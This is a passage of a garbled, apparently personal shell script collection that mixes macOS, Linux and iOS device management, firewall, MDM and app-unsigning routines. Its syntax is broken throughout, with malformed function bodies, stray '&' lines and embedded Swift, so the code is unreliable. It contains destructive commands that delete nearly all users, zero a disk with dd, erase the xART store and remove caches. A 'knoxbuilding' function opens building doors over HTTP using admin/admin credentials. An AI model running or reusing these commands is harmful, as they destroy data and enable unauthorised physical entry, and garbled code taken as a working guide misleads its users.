  [ "$(wc -l << "${keyStatusCF}")" -gt 1 ] && return 1

  

  [ "${keyStatusCF}" = "1" ] && return 0 || return 1

}

  

if iCloudPrivateRelay; then

  echo "iCloud Private Relay is: OFF" #ON Relay

else

  echo "iCloud Private Relay is: ON" #OFF really

fi

  

  

}

 %%

contactVerificationIOS=(

  

# Check for Contacts payloads in installed profiles

profiles -P | grep -A 10 -B 1 "com\.apple\.carddav\.account" || echo "No Contacts payload found."

&

# For detailed payload info (sudo required)

sudo profiles show -type configuration -output stdout | grep -A 20 -B 5 "PayloadType.*com.apple.carddav.account"

&

  

}

  

  

############### LinuxOS #################

#### 1.DEVICE MANAGEMENT ######

#### 2.DEVICE MANAGEMENT ######

#### 3.DEVICE MANAGEMENT ######

#### 4.DEVICE MANAGEMENT ######

#### 5.DEVICE MANAGEMENT ######

#### 6.DEVICE MANAGEMENT ######

#### 7.DEVICE MANAGEMENT ######

#### 8.DEVICE MANAGEMENT ######

#### 9.DEVICE MANAGEMENT ######

#### 10.DEVICE MANAGEMENT ######

  

linuxshell=(

    blockDNSResolv &

    firewa* &

    firewall &

    disablessh &

    disablerootnx &

}

  

  

blockLargePacketonPort=(

  

MIN_LEN=1          # minimum packet length to drop

PORT_RANGE="1024:65535"

  

# IPv4 INPUT chain example (adjust interface / chain as needed)

iptables -A INPUT  -p tcp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP

iptables -A INPUT  -p udp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP

  

# Optional: FORWARD if this box is routing

# iptables -A FORWARD -p tcp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP

# iptables -A FORWARD -p udp -m length --length ${MIN_LEN}: --dport ${PORT_RANGE} -j DROP    

}

getEstablishednx=(

    # Get source IPs of all established TCP connections

    wdsmaliciousIP=(sudo ss -tn state established | awk 'NR>1 {print $4}' | cut -d':' -f1 | sort | uniq)

    wdsmaliciousIP

}

  

setFileNamewds=(

    # Example keyword dictionary (one word per line)

    words=("*")

    # Input bash script file to scan

    input_file="$1"

    # Output directory for created files

    output_dir="./output"

    mkdir -p "$output_dir"

  

    # Extract lines with keywords and create files named by keywords

    for key in "${words[@]}"; do

        # Check if keyword exists in the file

        if grep -qw "$key" "$input_file"; then

            # Extract all lines containing the keyword into a file named after the keyword

            grep "$key" "$input_file" > "$output_dir/$key.txt"

            echo "Created file: $output_dir/$key.txt"

        fi

    done

  

}

removeUsernx=(

    # WARNING: This will delete nearly all users and groups except system-critical ones.

    # Run as root only on non-production/testing machines.

  

    # Define exempt system users & groups (adjust as needed)

    EXEMPT_USERS="root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody"

    EXEMPT_GROUPS="root|daemon|bin|sys|adm|tty|disk|lp|mail|news|uucp|man|games|users|nogroup|systemd-journal"

  

    echo "Deleting non-system users..."

    getent passwd | cut -d: -f1 | grep -Ev "^($EXEMPT_USERS)$" | while read -r user; do

      echo "Deleting user: $user"

      userdel -r "$user"

    done

  

    echo "Deleting non-system groups..."

    getent group | cut -d: -f1 | grep -Ev "^($EXEMPT_GROUPS)$" | while read -r group; do

      echo "Deleting group: $group"

      groupdel "$group"

    done

  

}

  

blockDNSResolv=(

  

    # Define trusted sources (adjust as needed)

    TRUSTED_NET=(192.168.0.1 $getRouterIP)

    #172.235.199.61

    echo "Blocking DNS resolver requests from all sources except $TRUSTED_NET..."

  

    # Add trusted source to trusted zone

    sudo firewall-cmd --permanent --zone=trusted --add-source=$TRUSTED_NET

  

    # Remove DNS service from public zone (blocks DNS from untrusted)

    sudo firewall-cmd --permanent --zone=public --add-rich-rule='rule family="ipv4"' --remove-service=dns

    sudo firewall-cmd --permanent --zone=public --add-rich-rule='rule family="ipv6"' --remove-service=dns

    # Reload firewall to apply changes

    sudo firewall-cmd --reload

  

}

firewall=(

  

    # Define the IP range or specific IP to block

    BLOCK_IP="192.168.1.100"

  

    # Check if iptables DROP rule for this IP already exists

    RULE_EXISTS=(sudo iptables -C INPUT -s $BLOCK_IP -j DROP 2>&1)

  

    if [[ $RULE_EXISTS == *"No chain/target/match"* ]]; then

      # The rule does not exist, so add it to block packets

      sudo iptables -A INPUT -s $BLOCK_IP -j DROP

      echo "Blocked packets from $BLOCK_IP"

    else

      # The rule exists, so remove it to unblock packets

      sudo iptables -D INPUT -s $BLOCK_IP -j DROP

      echo "Unblocked packets from $BLOCK_IP"

    fi

  

}

findInfoSSD=(

    echo "Detecting SSD devices in system..."

    # Using lsblk and checking for rotational flag 0 (indicates SSD)

    sudo lsblk -d -o NAME,ROTA,MODEL,VENDOR,SIZE | while read name rota model vendor size; do

      # Skip header line

      [[ "$name" == "NAME" ]] && continue

      if [[ "$rota" == "0" ]]; then

        # echo "SSD Device found: /dev/$name - $vendor $model, Size: $size"

      fi

    done

  

}

encryptLinuxSSD=(

    # Variables

    DISK="/dev/sda"                # Replace with your SSD device name

    MAPPER_NAME="cryptssd"         # Name for the mapped encrypted device

    MOUNT_POINT="/mnt/encrypted"  # Mount point directory

  

    # Install cryptsetup if not present

    if ! command -v cryptsetup &> /dev/null; then

        echo "Installing cryptsetup..."

        sudo apt-get update

        sudo apt-get install -y cryptsetup

    fi

  

    # Wipe existing data on disk (optional, but recommended)

    echo "Wiping disk $DISK ..."

    sudo dd if=/dev/zero of="$DISK" bs=1M status=progress

  

    # Setup LUKS encryption

    echo "Setting up LUKS on $DISK ..."

    sudo cryptsetup luksformat "$DISK"

  

    # Open encrypted container

    echo "Opening encrypted device as $MAPPER_NAME ..."

    sudo cryptsetup luksOpen "$DISK" "$MAPPER_NAME"

  

    # Format with ext4 filesystem (change if desired)

    echo "Formatting encrypted device ..."

    sudo mkfs.ext4 /dev/mapper/"$MAPPER_NAME"

  

    # Create mount point and mount

    sudo mkdir -p "$MOUNT_POINT"

    sudo mount /dev/mapper/"$MAPPER_NAME" "$MOUNT_POINT"

  

    echo "Encrypted SSD is mounted at $MOUNT_POINT"

  

}

ipZone=(

  

    # Create folder

    mkdir -p ip_ranges

  

    # Download country IP block files from ipdeny.com

    ukIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/tw.zone -o ip_ranges/uk.zone)

    sgIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/sg.zone -o ip_ranges/sg.zone)

    krIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/kr.zone -o ip_ranges/kr.zone)

    usIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/us.zone -o ip_ranges/us.zone)

    jpnIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/jp.zone -o ip_ranges/jp.zone)

    hkIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/hk.zone -o ip_ranges/hk.zone)

    twIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/tw.zone -o ip_ranges/tw.zone)

    EveryIP=(curl -sS https://www.ipdeny.com/ipblocks/data/countries/*.zone -o ip_ranges/*.zone)

    # Concatenate to one file

    # cat ip_ranges/sg.zone ip_ranges/kr.zone ip_ranges/us.zone > ip_ranges/combined.zone

  

    # echo "Collected IP ranges:"

    # wc -l ip_ranges/combined.zone

    # cat ip_ranges/combined.zone

}

  

blockPacket=(

    SOURCE_IP=$1

    DESTINATION_IP=$2

    # ZONE_IN="eth0"    # Incoming interface (source zone)

    # ZONE_OUT="eth1"   # Outgoing interface (destination zone)

    # Block traffic from SOURCE_IP to DESTINATION_IP between zones

    sudo iptables -A FORWARD -i "$ZONE_IN" -o "$ZONE_OUT" -s "$SOURCE_IP" -d "$DESTINATION_IP" -j DROP

}

  

deleteosx=(

    sudo $XARTURL --erase-all

    sudo xartutil --erase-all

}

  

disablessh=(

    if [[ "$OSTYPE" == "darwin"* ]]; then

        echo "Disabling SSH on macOS..."

        sudo systemsetup -f -setremotelogin off

    elif [[ "$OSTYPE" == "linux-android" ]]; then

        echo "Stopping SSH on Android..."

        pkill sshd

    elif [[ "$OSTYPE" == "linux-gnu" ]]; then

        # Function to stop and disable a service

        disable_service() {

            local service_name=$1

            echo "Stopping and disabling $service_name..."

            sudo systemctl stop "$service_name"

            sudo systemctl disable "$service_name"

            sudo systemctl mask "$service_name"

        }

  

        # Disable TFTP service (common names: tftp, tftpd, tftpd-hpa)

        disable_service "tftp"  # Change service name if different

        disable_service "tftpd"

        disable_service "tftpd-hpa"

        disable_service "xinetd"  # in case TFTP is managed by xinetd

  

        # Disable SSH service

        disable_service "ssh"

        disable_service "sshd"

  

        # Disable SMB/CIFS service (Samba)

        disable_service "smb"

        disable_service "smbd"

        disable_service "nmb"

        disable_service "nmbd"

    else

        echo "OS not supported by this script."

    fi

  

  

}

  

  

disablerootnx=(

  

    # 1. Change root shell to /sbin/nologin

    sudo sed -i.bak 's|^root:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:/bin/bash|root:x:0:0:root:/root:/sbin/nologin|' /etc/passwd

  

    # 2. Disable root login on all TTYs by emptying /etc/securetty

    sudo mv /etc/securetty /etc/securetty.bak

    sudo touch /etc/securetty

    sudo chmod 600 /etc/securetty

  

    # 3. Disable SSH root login

    sudo sed -i.bak '/^PermitRootLogin/ s/.*/PermitRootLogin no/' /etc/ssh/sshd_config || \

        echo 'PermitRootLogin no' | sudo tee -a /etc/ssh/sshd_config

    sudo systemctl restart sshd

  

    # 4. Restrict root access via PAM for login and sshd

    for SERVICE in login sshd; do

        PAM_FILE="/etc/pam.d/$SERVICE"

        if ! grep -q "pam_listfile.so" "$PAM_FILE"; then

            echo "auth required pam_listfile.so onerr=succeed item=user sense=deny file=/etc/ssh/deniedusers" | sudo tee -a "$PAM_FILE"

        fi

    done

  

    # Create deniedusers file with only root user listed

    echo "root" | sudo tee /etc/ssh/deniedusers

    sudo chmod 600 /etc/ssh/deniedusers

  

    echo "Root access has been disabled using multiple methods."

  

}

  

rockySetup=(

    # set -e

    echo "Searching for installed VNC-related packages..."

    # List of common VNC package name patterns to remove

    VNC_PACKAGES=(sudo rpm -qa | grep -i vnc)

  

    if [ -z "$VNC_PACKAGES" ]; then

      echo "No VNC packages found on your system."

      exit 0

    fi

  

    echo "Found these VNC packages:"

    echo "$VNC_PACKAGES"

  

    echo "Removing VNC packages..."

  

    sudo dnf remove -y $VNC_PACKAGES

  

    echo "All detected VNC packages removed."

  

  

    cd /home/root/documents && mkdir sh

  

    # Define services to disable

    services=(

      sshd         # SSH daemon

      smb          # Samba server (SMB)

      nmb          # Samba NetBIOS name server

      cockpit.socket  # Cockpit socket activation (disables cockpit)

      vsftpd       # FTP server (Very Secure FTP Daemon)

    )

  

    # Stop and disable each service

    for service in "${services[@]}"; do

      echo "Stopping and disabling $service..."

      sudo systemctl stop "$service"

      sudo systemctl disable "$service"

    done

  

    # Reload systemd to apply changes

    echo "Reloading systemd daemon..."

    sudo systemctl daemon-reload

  

    echo "All specified remote services have been disabled and stopped."

    sudo encryptLinuxSSD

}

  

  

syncFileonRocky=(

  

    # Check if brew command exists

    if ! command -v brew &> /dev/null; then

      echo "Homebrew not found. Installing Homebrew..."

      # Install Homebrew

      #/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

      # Add brew to PATH (Apple Silicon vs Intel detection)

      #if [[ -d "/opt/homebrew/bin" ]]; then

        #eval "$(/opt/homebrew/bin/brew shellenv)"

      #elif [[ -d "/usr/local/bin" ]]; then

        #eval "$(/usr/local/bin/brew shellenv)"

      #fi

    else

      echo "Homebrew is already installed."

      /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"

      rm -rf /opt/homebrew/etc/ /opt/homebrew/share/ /opt/homebrew/var/

      &

    fi

  

  

if [[ "$(uname -s)" == 'Linux' ]]; then

    echo "Linux detected"

 # Now install rsync via brew

    #brew install rsync

    brew uninstall rsync

    sudo apt update

    sudo apt uninstall rsync

else

    echo "Not Linux ($(uname -s))"

fi

  

    # Variables: adjust these to your environment

    LOCAL_CODE_DIR="$QQ_FILE_LOCAL"

    REMOTE_USER="root"

    REMOTE_HOST="$Q_QontheskyshellRsync"

    REMOTE_BACKUP_DIR="$deployBASEURL"

  

  

  

    # REMOTE_HOST_KEY="$QQ2I"

    # REMOTE_BACKUP_DIR_KEY="$KEYBASEURL"

  

  

    # Optional: path to SSH private key if needed

    # SSH_KEY="/path/to/your/private/key"  # Leave empty if default key or password auth

  

    # Rsync options:

    # -a : archive mode (preserves permissions, timestamps, symbolic links, etc.)

    # -v : verbose output

    # -z : compress data during transfer

    # -e : specify remote shell, here ssh with the private key if provided

    INCLUDE_FOLDER="$QQ_FILE_LOCALlldbapp $QQ_FILE_LOCALlldbops $QQ_FILE_LOCALmodules $QQ_FILE_LOCALoascript $QQ_FILE_LOCALinitlldb.sh"

    RSYNC_CMD="rsync -avz  --exclude '$QQ_FILE_LOCAL.fslckout $QQ_FILE_LOCAL.fossil-settings $QQ_FILE_LOCALlldbshellByQQ' --include '$INCLUDE_FOLDER'"

# && sudo chmod 700 $deployBASEURL

    # Run rsync to sync local code directory to remote backup directory

    $RSYNC_CMD "$LOCAL_CODE_DIR" "${REMOTE_USER}@${REMOTE_HOST}:$REMOTE_BACKUP_DIR"

    # $RSYNC_CMD "$LOCAL_CODE_DIR" "${REMOTE_USER}@${REMOTE_HOST}:$REMOTE_BACKUP_DIR_DEPLOY"

}

  

DownloadRsyncfile=(

  

    # Variables - update these accordingly

    REMOTE_USER="qqonthestarshell"

    REMOTE_HOST="${Q_QontheskyshellRsync}"

    REMOTE_BACKUP_PATH="$linuxBASEURL/backup/qqontheskyshell.archive.tar.gz"

    LOCAL_DOWNLOAD_DIR="$osxBASEURL"

  

    # Create local download directory if not exists

    mkdir -p "$LOCAL_DOWNLOAD_DIR"

  

    # Copy backup file from remote to local

    # scp "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_BACKUP_PATH}" "$LOCAL_DOWNLOAD_DIR/"

  

    # Extract the downloaded backup file

    cd "$LOCAL_DOWNLOAD_DIR" || exit

  

    # Detect file type and extract accordingly

    FILENAME=(basename "$REMOTE_BACKUP_PATH")

  

    if [[ "$FILENAME" == *.tar.gz ]] || [[ "$FILENAME" == *.tgz ]]; then

        tar -xzvf "$FILENAME"

    elif [[ "$FILENAME" == *.zip ]]; then

        unzip "$FILENAME"

    elif [[ "$FILENAME" == *.tar.bz2 ]]; then

        tar -xjvf "$FILENAME"

    else

        echo "Unsupported archive format: $FILENAME"

        exit 1

    fi

}

&

  

  

usboverIPshell=(

*usbover* &

# Stop VNC and block on usb0

sudo systemctl stop vncserver-x11-serviced &

sudo iptables -A INPUT -i usb0 -p tcp --dport 5900 -j DROP &  # Block VNC port 5900 on usb0

sudo iptables-save > /etc/iptables/rules.v4 &  # Persist rules (install iptables-persistent if needed)

exit 0 &

}

  

  

############# OSLEVEL #################

  

detectOS() {

    local os="$1"

    local script="$2"

  

    # macOS check (Darwin kernel)

    if [ "$(uname -s)" = "Darwin" ]; then

        if command -v sw_vers >/dev/null 2>&1; then

            PRODUCT=(sw_vers -productName)

            VERSION=(sw_vers -productVersion)

  

            if [[ "$PRODUCT" == *"iPhone"* || "$PRODUCT" == *"iPad"* ]]; then

                os="iOS_iPadOS"

                echo "Detected: $os $VERSION ($(sw_vers -productName))"

        $script & exit 0 &

            elif [[ "$PRODUCT" == *"watch"* ]]; then

                os="watchOS"

                echo "Detected: $os $VERSION"

        $script & exit 0 &

            else

                os="macOS"

                echo "Detected: $os $VERSION"

        $script & exit 0 &

            fi

        fi

  

    # Linux check

    elif [ "$(uname -s)" = "Linux" ]; then

        if [ -f /etc/os-release ]; then

            source /etc/os-release

            os="$ID ($PRETTY_NAME)"

        else

            os="Linux"

        $script & exit 0 &

        fi

        echo "Detected: $os"

  

        # Android specific (Termux/embedded)

        if [ -d /system/app ] || [ -f /proc/version ] && grep -qi android /proc/version; then

            os="Android"

            echo "Detected: $os ($(getprop ro.build.version.release 2>/dev/null || echo "unknown"))"

        $script & exit 0 &

        fi

  

    else

        os="Unknown"

        echo "Detected: $os ($(uname -a))"

    fi

  

    exit 0 &

}

  

  

####### RF modules #########

  

  

  

  

  

  

  

  

########## WDS & NETWORK & CELLULAR #########

  

satelliteModules=(

  

####### GET SAT IP ########

  

# Monitoring interval in seconds

INTERVAL=30

  

# Store latest IP here

#LOGFILE="$HOME/public_ip.log"

#TMPFILE="/tmp/cur_ip.txt"

  

# Third‑party IP‑lookup service (choose one)

# Available inside Blink as long as network is on

API_URL="https://ifconfig.me"     # lightweight, common choice

# API_URL="https://api.ipify.org"  # alternative

  

while true; do

  # Get current public IP; timeout prevents hanging

  if curl -fsS --max-time 10 "$API_URL" > "$TMPFILE" 2>/dev/null; then

    SAT_IP=(cat "$TMPFILE" | tr -d '[:space:]')

  else

    SAT_IP="UNKNOWN"

  fi

  

  DATE_STR=(date "+%Y-%m-%d %H:%M:%S")

  

  SAT_IP

  sleep "$INTERVAL"

done

  

exit 0 &

  

}

  

  

  

  

  

  

######## samsung knox ###### 

knoxbuilding=(

targetdoor=$1 &

    doornumber=(1222 1223 13...10* -10*...1*)

    ROOMTARGET=doornumber 

KNOX_IP="192.168.1.100"

USERNAME="admin"

PASSWORD="admin"

curl -sS -X GET "http://${KNOX_IP}/fcgi/OpenDoor?action=OpenDoor&DoorNum=$doornumber&UserName=${USERNAME}&Password=${PASSWORD}"

&

  

lldbFrame "$getRouter* $ROOMTARGET $QQLOCAL" "QQAPP & alarm* & reckonapp & knoxbuilding & exit 0 &" "$gen*" &

  

}

  

  

  

  

  

  

  

  

clearCacheIOS=(

  

USER=`stat -f%Su /dev/console`

sudo /bin/rm -rf /Library/Caches/* > /dev/null 2>&1

sudo /bin/rm -rf /Users/$USER/Library/Caches/* > /dev/null 2>&1

  

  

}

  

  

  

  

connectQQBLE=(

IPHONE_BT_ID="$QQDEVICESER"

  

#"1:-AA-BB-CC-DD-EE-FF}"

  

if ! command -v blueutil >/dev/null 2>&1; then

  echo "blueutil not found. Install it with: brew install blueutil"

  exit 1

fi

  

blueutil --power 1 &

  

if [ "$(blueutil --is-connected "$IPHONE_BT_ID" 2>/dev/null || echo 0)" = "1" ]; then

  echo "iPhone already connected: $IPHONE_BT_ID"

  exit 0

fi

  

  

blueutil --connect "$IPHONE_BT_ID"

  

sleep 1

  

if [ "$(blueutil --is-connected "$IPHONE_BT_ID" 2>/dev/null || echo 0)" = "1" ]; then

  echo "Connected successfully."

else

  echo "Connection attempt finished, but device is not reported as connected."

  exit 2

fi

  

  

  

arcOSUIDetection=(

  

STATE_DIR="${HOME}/.arcosnx-cursor"

STATE_FILE="${STATE_DIR}/last_state"

mkdir -p "$STATE_DIR"

  

NEW_STATE="${1:-unknown}"

LAST_STATE="$(cat "$STATE_FILE" 2>/dev/null || true)"

  

declare -A CURSOR_DICT=(

[arrow]="default pointer"

[iBeam]="text insertion"

[crosshair]="precision select"

[closedHand]="dragging active"

[openHand]="grab available"

[pointingHand]="link/action hover"

[resizeLeft]="resize west"

[resizeRight]="resize east"

[resizeLeftRight]="resize east-west"

[resizeUp]="resize north"

[resizeDown]="resize south"

[resizeUpDown]="resize north-south"

[disappearingItem]="delete/remove animation"

[iBeamCursorForVerticalLayout]="vertical text"

[operationNotAllowed]="forbidden"

[dragLink]="drag creates link"

[dragCopy]="drag copies"

[contextualMenu]="context menu"

[unknown]="unmapped"

)

  

if [[ "$NEW_STATE" != "$LAST_STATE" ]]; then

printf '%s\n' "$NEW_STATE" > "$STATE_FILE"

/usr/local/bin/arcOSnx "$NEW_STATE" "${CURSOR_DICT[$NEW_STATE]:-unmapped}"

arcOSBaseKit & arcOSnx &

fi

 & #mobile config BaseQQLAND > #bundle BUNDLE_ID="${1:?Usage: $0 com.example.app}" xcrun simctl uninstall booted "$BUNDLE_ID" || true & xcrun simctl erase all & MDM_API_BASE="$APPLEMDM" & DEVICE_ID="$FULL_IOS_SERIAL" & APP_ID="*" & MDM_API_BASE="${MDM_API_BASE:?Set MDM_API_BASE}" #MDM_TOKEN="${MDM_TOKEN:?Set MDM_TOKEN}" & DEVICE_ID="${1:?Usage: $0 DEVICE_ID APP_ID}" & APP_ID="${2:?Usage: $0 DEVICE_ID APP_ID}" & # 1. Remove managed app configuration & curl -sS -X DELETE \ -H "Authorization: Bearer $MDM_TOKEN" \ -H "Accept: application/json" \ "${MDM_API_BASE}/devices/${DEVICE_ID}/apps/${APP_ID}/managed-config" || true & # 2. Uninstall the app & curl -sS -X POST \ -H "Authorization: Bearer $MDM_TOKEN" \ -H "Accept: application/json" \ "${MDM_API_BASE}/devices/${DEVICE_ID}/apps/${APP_ID}/uninstall" || true /

                                             )

  

  

  

                                             #deleteICloudDrive

                                             deleteICloudDriveQQshell=()

                                             import Foundation

  

                                             enum MoveError: Error {

                                             case iCloudUnavailable

                                             case sourceNotFound

                                             }

  

                                             func moveHiddenFileFromICloudToTmp(named fileName: String) throws -> URL {

                                             let fm = FileManager.default

  

                                             guard let iCloudRoot = fm.url(forUbiquityContainerIdentifier: nil)?

                                             .appendingPathComponent("Documents", isDirectory: true) else {

                                             throw MoveError.iCloudUnavailable

                                             }

  

                                             let sourceURL = iCloudRoot.appendingPathComponent(fileName, isDirectory: false)

                                             guard fm.fileExists(atPath: sourceURL.path) else {

                                             throw MoveError.sourceNotFound

                                             }

  

                                             let tmpDir = fm.temporaryDirectory

                                             let destURL = tmpDir.appendingPathComponent(fileName, isDirectory: false)

  

                                             if fm.fileExists(atPath: destURL.path) {

                                             try fm.removeItem(at: destURL)

                                             }

  

                                             try fm.moveItem(at: sourceURL, to: destURL)

                                             return destURL

                                             }

  

  

  

                                             #unsigning

  

                                             unsigningApp=(

  

                                             APP_PATH="$1"  # e.g., Payload/YourApp.app

  

                                             if [ -z "$APP_PATH" ]; then

                                               echo "Usage: $0 <path-to-app.app>"

                                                 exit 1

                                                 fi

  

                                                 # Remove signature from main app

                                                 codesign --remove-signature "$APP_PATH"

  

                                                 # Remove signature from all frameworks

                                                 for fw in "$APP_PATH/Frameworks"/*.framework; do

                                                   [ -e "$fw" ] && codesign --remove-signature "$fw"

                                                   done

  

                                                   # Remove signature from dylibs

                                                   for dylib in "$APP_PATH/Frameworks"/*.dylib; do

                                                     [ -e "$dylib" ] && codesign --remove-signature "$dylib"

                                                     done

  

                                                     # Clean CodeResources and _CodeSignature

                                                     rm -rf "$APP_PATH/_CodeSignature"

                                                     rm -rf "$APP_PATH/CodeResources"

  

                                             echo "Signature removed from $APP_PATH"

  

  

  

  

  

  

  

                                             RED='\033[0;31m'

                                             GREEN='\033[0;32m'

                                             YELLOW='\033[1;33m'

                                             NC='\033[0m'

  

                                             usage=(

                                             echo "Usage: $0 <path_to_app_or_ipa>"

                                             echo ""

                                             echo "Examples:"

                                             echo "  $0 MyApp.app"

                                             echo "  $0 MyApp.ipa"

                                             exit 1

  

  

                                             if [ $# -ne 1 ]; then

                                                 usage

                                                 fi

  

                                                 APP_PATH="$1"

  

                                                 if [ ! -e "$APP_PATH" ]; then

                                                     echo -e "${RED}Error: Path '$APP_PATH' does not exist${NC}"

                                                         exit 1

                                                         fi

  

                                                         echo -e "${GREEN}=== Starting Xcode signing removal ===${NC}"

                                                         echo -e "${YELLOW}Target: $APP_PATH${NC}"

  

  

  

                                             # Handle IPA files

                                             TEMP_DIR=""

                                             if [[ "$APP_PATH" == *.ipa ]]; then

                                             echo -e "${GREEN}Extracting IPA...${NC}"

                                             TEMP_DIR=$(mktemp -d)

                                             unzip -q "$APP_PATH" -d "$TEMP_DIR"

                                             APP_PATH="$TEMP_DIR/Payload/*.app"

                                             APP_PATH=$(ls "$APP_PATH" | head -n 1)

                                             fi

  

  

  

  

                                             if [[ ! -d "$APP_PATH" ]] || [[ ! -f "$APP_PATH/Info.plist" ]]; then

                                             echo -e "${RED}Error: Not a valid iOS app bundle${NC}"

                                             [ -n "$TEMP_DIR" ] && rm -rf "$TEMP_DIR"

                                             exit 1

                                             fi

  

                                             echo -e "${GREEN}Found app: $APP_PATH${NC}"

  

                                             remove_signature=(

                                             local bundle="$1"

                                             [ ! -d "$bundle" ] && return

                                             echo -e "${YELLOW}Processing: $bundle${NC}"

                                             # Remove _CodeSignature

                                             [ -d "$bundle/_CodeSignature" ] && rm -rf "$bundle/_CodeSignature" && \

                                             echo -e "  ${GREEN}- Removed _CodeSignature${NC}"

                                             # Remove CodeResources

                                             [ -f "$bundle/CodeResources" ] && rm -f "$bundle/CodeResources" && \

                                             echo -e "  ${GREEN}- Removed CodeResources${NC}"

                                             # Remove embedded.mobileprovision

                                             [ -f "$bundle/embedded.mobileprovision" ] && rm -f "$bundle/embedded.mobileprovision" && \

                                             echo -e "  ${GREEN}- Removed embedded.mobileprovision${NC}"

                                             # Use codesign --remove-signature

                                             if command -v codesign &> /dev/null; then

                                             codesign --remove-signature "$bundle" 2>/dev/null || true

                                             echo -e "  ${GREEN}- Ran codesign --remove-signature${NC}"

                                             fi

  

  

                                             # Main app

                                             echo -e "${GREEN}=== Main app bundle ===${NC}"

                                             remove_signature "$APP_PATH"

  

                                             # Frameworks

                                             echo -e "${GREEN}=== Frameworks ===${NC}"

                                             [ -d "$APP_PATH/Frameworks" ] && for fw in "$APP_PATH/Frameworks"/*; do

                                             [ -d "$fw" ] && remove_signature "$fw"

                                             done

  

                                             # App Extensions (*.appex) - includes Network Extensions

                                             echo -e "${GREEN}=== App Extensions (*.appex) ===${NC}"

                                             find "$APP_PATH" -name "*.appex" -type d 2>/dev/null | while read -r ext; do

                                             echo -e "${YELLOW}Extension: $ext${NC}"

                                             remove_signature "$ext"

                                             [ -d "$ext/Frameworks" ] && for fw in "$ext/Frameworks"/*; do

                                             [ -d "$fw" ] && remove_signature "$fw"

                                             done

                                             done

  

                                             # Nested apps (App Clips, etc)

                                             echo -e "${GREEN}=== Nested apps (App Clips) ===${NC}"

                                             find "$APP_PATH" -name "*.app" -type d 2>/dev/null | while read -r nested; do

                                             [ "$nested" == "$APP_PATH" ] && continue

                                             echo -e "${YELLOW}Nested: $nested${NC}"

                                             remove_signature "$nested"

                                             [ -d "$nested/Frameworks" ] && for fw in "$nested/Frameworks"/*; do

                                             [ -d "$fw" ] && remove_signature "$fw"

                                             done

                                             done

  

                                             # Remove entitlements files

                                             echo -e "${GREEN}=== Removing entitlements ===${NC}"

                                             for ent in "$APP_PATH/Entitlements.plist" "$APP_PATH/entitlements.plist"; do

                                             [ -f "$ent" ] && rm -f "$ent" && echo -e "${GREEN}- Removed: $ent${NC}"

                                             done

  

                                             # Repack IPA

                                             if [ -n "$TEMP_DIR" ]; then

                                             echo -e "${GREEN}Repacking IPA...${NC}"

                                             OUTPUT_IPA="${APP_PATH%.app}.unsigned.ipa"

                                             zip -qr "$OUTPUT_IPA" Payload/

                                             echo -e "${GREEN}Created: $OUTPUT_IPA${NC}"

                                             rm -rf "$TEMP_DIR"

                                             fi

  

                                             echo -e "${GREEN}=== Complete ===${NC}"

                                             echo -e "${YELLOW}App is now unsigned. Resign before installation.${NC}"

  

  

                                             xcodebuild \

                                               -workspace YourProject.xcworkspace \

                                                 -scheme YourScheme \

                                                   -configuration Release \

                                                     archive \

                                                       -archivePath buildArchive/YourProject.xcarchive \

                                                         CODE_SIGN_IDENTITY="" \

                                                           CODE_SIGNING_REQUIRED=NO \

                                                             CODE_SIGNING_ALLOWED=NO

  

                                             #buildBluePrint_IOS=(

  

                                             # Set colors for output

                                             RED='\033[0;31m'

                                             GREEN='\033[0;32m'

                                             YELLOW='\033[0;33m'

                                             NC='\033[0m' # No Color

  

                                             # Default values

                                             BUILD_TYPE="release"          # or "release"

                                             SIMULATOR_NAME="*"  # Simulator device name

                                             apple_OS_TARGET="*"         # $apple_OS_TARGET version

                                             SCHEME="${1:-arcOSBluePrint}" # Scheme name (default: BlueprintApp)

                                             PROJECT_DIR="${2:-./iosProjectFiles}"       # Project directory (default: current)

  

                                             echo "🔨 Building $apple_OS_TARGET Blueprint App..."

                                             echo "Project directory: $PROJECT_DIR"

                                             echo "Scheme: $SCHEME"

                                             echo "Build type: $BUILD_TYPE"

                                             echo "Simulator: $SIMULATOR_NAME ($apple_OS_TARGET)"

  

                                             # Check if Xcode is installed

                                             if ! command -v xcodebuild &> /dev/null; then

                                                 echo "${RED}❌ Xcode not found. Install Xcode from Apple Developer website.${NC}"

                                                     exit 1

                                             fi

  

                                             # Navigate to project directory

                                             cd "$PROJECT_DIR" || { echo "${RED}❌ Failed to enter project directory${NC}"; exit 1; }

  

                                             # Check if project files exist

                                             if [ ! -f "Package.swift" ] && [ ! -f "*.xcodeproj" ] && [ ! -f "*.xcworkspace" ]; then

                                             echo "${RED}❌ No Swift package or Xcode project found in $PROJECT_DIR${NC}"

                                             echo "ℹ️  Create Package.swift or open in Xcode first"

                                             exit 1

                                             fi

  

                                             # List available simulators

                                             echo "📱 Finding simulators..."

                                             xcrun simctl list devices available | grep -E "$SIMULATOR_NAME" || {

                                             echo "${YELLOW}⚠️  Simulator '$SIMULATOR_NAME' not found. Listing available simulators:${NC}"

                                             xcrun simctl list devices available | grep $apple_OS_TARGET

                                             }

  

                                             # Get simulator UUID

                                             SIMULATOR_UUID=$(xcrun simctl list devices available | grep -E "$SIMULATOR_NAME.*$apple_OS_TARGET" | awk -F'\\(' '{print $2}' | awk -F')' '{print $1}' | head -1)

  

                                             if [ -z "$SIMULATOR_UUID" ]; then

                                             echo "${RED}❌ Could not find simulator UUID. Using first available $apple_OS_TARGET simulator.${NC}"

                                             SIMULATOR_UUID=$(xcrun simctl list devices available | grep $apple_OS_TARGET | awk -F'\\(' '{print $2}' | awk -F')' '{print $1}' | head -1)

                                             fi

  

